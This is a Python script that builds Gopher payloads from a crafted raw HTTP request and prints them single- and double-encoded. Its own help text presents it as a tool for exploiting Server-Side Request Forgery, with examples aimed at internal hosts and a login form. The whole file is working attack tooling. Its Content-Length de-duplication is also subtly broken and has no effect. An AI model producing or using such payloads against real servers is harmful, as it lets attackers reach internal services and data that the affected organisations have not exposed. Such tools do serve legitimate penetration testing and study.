#!/usr/bin/env python3
import urllib.parse
import argparse
import sys

def generate_payloads(http_method, host, port, path, headers, data):
    """
    Core function to generate the Gopher payloads from provided components.
    """
    # --- Construct the Raw HTTP Request ---
    request_lines = [f"{http_method.upper()} {path} HTTP/1.1"]
    # Ensure Host header is present, either from user or generated
    if not any(h.lower().startswith('host:') for h in headers):
        request_lines.append(f"Host: {host}")
    
    request_lines.extend(headers)

    # Correctly handle Content-Length and the body
    if http_method.upper() in ["POST", "PUT"]:
        # Ensure Content-Length isn't duplicated
        headers = [h for h in headers if not h.lower().startswith('content-length:')]
        content_length = len(data.encode('utf-8'))
        request_lines.append(f"Content-Length: {content_length}")
        request_lines.append("") # Blank line to separate headers from body
        request_lines.append(data)
    else:
        # Add final blank lines for other requests
        request_lines.append("")
        request_lines.append("")

    # Join with CRLF for correct HTTP line endings.
    # The gopher payload must have a character at the start. '_' is common.
    raw_http_request = "\r\n".join(request_lines)
    gopher_data_payload = "_" + raw_http_request

    # --- Generate and Print Outputs ---
    
    # 1. Raw HTTP Request (for verification)
    raw_output = raw_http_request.replace("\r", "[CR]").replace("\n", "[LF]\n")

    # 2. Standard Gopher URL (Single-Encoded)
    encoded_data_part = urllib.parse.quote(gopher_data_payload, safe='')
    single_encoded_url = f"gopher://{host}:{port}/{encoded_data_part}"

    # 3. Double-Encoded Payload (for use in SSRF parameters)
    double_encoded_url = urllib.parse.quote(single_encoded_url)

    # --- Print the results ---
    print("\n" + "="*50)
    print("--- Generated Gopher Payloads ---")
    print("="*50)
    
    print("\n[1] Raw HTTP Request (for verification, CRLF shown as [CR][LF]):")
    print(raw_output)
    
    print("\n" + "="*50)
    print("\n[2] Standard Gopher URL (Single-Encoded):")
    print("Use this when a gopher URL is required directly.")
    print(single_encoded_url)

    print("\n" + "="*50)
    print("\n[3] Double-Encoded Payload (for SSRF):")
    print("Use this when passing the gopher URL as a parameter to another URL.")
    print(double_encoded_url)
    print("\n" + "="*50)

def run_interactive_mode():
    """
    Runs the script in a user-friendly interactive prompt mode.
    """
    try:
        print("--- Gopher Payload Generator (Interactive Mode) ---")
        http_method = input("Enter the HTTP method (GET, POST, PUT): ").upper()
        if http_method not in ["GET", "POST", "PUT"]:
            print("Invalid HTTP method. Exiting.")
            return

        host = input("Enter the target host (e.g., 127.0.0.1): ")
        port = input("Enter the target port (e.g., 80): ")
        path = input("Enter the request path (e.g., /index.php): ")

        print("Enter HTTP headers, one per line (e.g., 'User-Agent: MyClient'). Press Enter on an empty line to finish.")
        headers = []
        while True:
            header = input()
            if not header:
                break
            headers.append(header)

        data = ''
        if http_method in ["POST", "PUT"]:
            print("Enter the data for the request body:")
            data = input()
        
        generate_payloads(http_method, host, port, path, headers, data)

    except KeyboardInterrupt:
        print("\n\nScript execution cancelled by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")

def main():
    """
    Main function to parse arguments and decide the execution mode.
    """
    parser = argparse.ArgumentParser(
        description="""A script to generate Gopher payloads for crafting HTTP requests.
Useful for exploiting Server-Side Request Forgery (SSRF) vulnerabilities.
The script can be run with command-line arguments or in interactive mode.""",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  # Run in interactive mode
  python3 %(prog)s

  # Generate a GET request
  python3 %(prog)s GET 127.0.0.1 80 /

  # Generate a POST request with headers and data
  python3 %(prog)s POST 127.0.0.1 80 /login.php --headers "Content-Type: application/x-www-form-urlencoded" --data "user=admin&pass=123"

  # Generate a PUT request with data from a file
  python3 %(prog)s PUT 127.0.0.1 80 /api/v1/resource --file ./data.json --headers "Content-Type: application/json"
"""
    )

    # Positional arguments
    parser.add_argument('method', nargs='?', help='The HTTP method (GET, POST, PUT).')
    parser.add_argument('host', nargs='?', help='The target host (e.g., 127.0.0.1).')
    parser.add_argument('port', nargs='?', type=int, help='The target port (e.g., 80).')
    parser.add_argument('path', nargs='?', help='The request path (e.g., /index.php).')
    
    # Optional arguments
    parser.add_argument('--headers', action='append', default=[], help='An HTTP header. Can be specified multiple times (e.g., --headers "User-Agent: MyClient").')
    
    # Group for mutually exclusive data options
    data_group = parser.add_mutually_exclusive_group()
    data_group.add_argument('--data', help='The request body data for POST/PUT requests.')
    data_group.add_argument('--file', help='File containing the request body data for POST/PUT.')

    # If run with no arguments, or only the script name, enter interactive mode
    if len(sys.argv) == 1:
        run_interactive_mode()
        return

    args = parser.parse_args()
    
    # Check if positional args are missing in non-interactive mode
    if not all([args.method, args.host, args.port, args.path]):
        parser.print_help()
        print("\nError: The method, host, port, and path arguments are required in non-interactive mode.")
        sys.exit(1)

    # Read data from file if specified
    data = args.data or ''
    if args.file:
        try:
            with open(args.file, 'r') as f:
                data = f.read()
        except FileNotFoundError:
            print(f"Error: File not found at '{args.file}'")
            sys.exit(1)

    if args.method.upper() == 'GET' and (args.data or args.file):
        print("Warning: A GET request should not have a message body. The provided data will be ignored.")
        data = ''

    generate_payloads(args.method, args.host, args.port, args.path, args.headers, data)

if __name__ == "__main__":
    main()
